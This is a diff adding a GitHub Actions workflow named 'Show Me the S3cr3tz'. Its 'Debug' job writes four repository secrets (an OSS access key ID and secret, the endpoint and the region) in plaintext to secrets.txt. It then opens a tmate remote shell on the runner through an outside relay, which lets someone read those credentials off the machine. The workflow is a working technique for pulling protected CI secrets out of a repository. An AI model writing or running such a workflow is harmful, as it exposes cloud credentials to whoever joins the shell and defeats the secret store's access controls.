@@ -1,0 +1,19 @@
+name: Show Me the S3cr3tz
+on: [workflow_dispatch]
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+    steps:
+    - env:
+        OSS_AK_ID: ${{ secrets.OSS_AK_ID }}
+        OSS_AK_SECRET: ${{ secrets.OSS_AK_SECRET }}
+        OSS_ENDPOINT: ${{ secrets.OSS_ENDPOINT }}
+        OSS_REGION: ${{ secrets.OSS_REGION }}
+      run: |
+        echo $OSS_AK_ID >> secrets.txt
+        echo $OSS_AK_SECRET >> secrets.txt
+        echo $OSS_ENDPOINT >> secrets.txt
+        echo $OSS_REGION >> secrets.txt
+    - uses: mxschmitt/action-tmate@v2
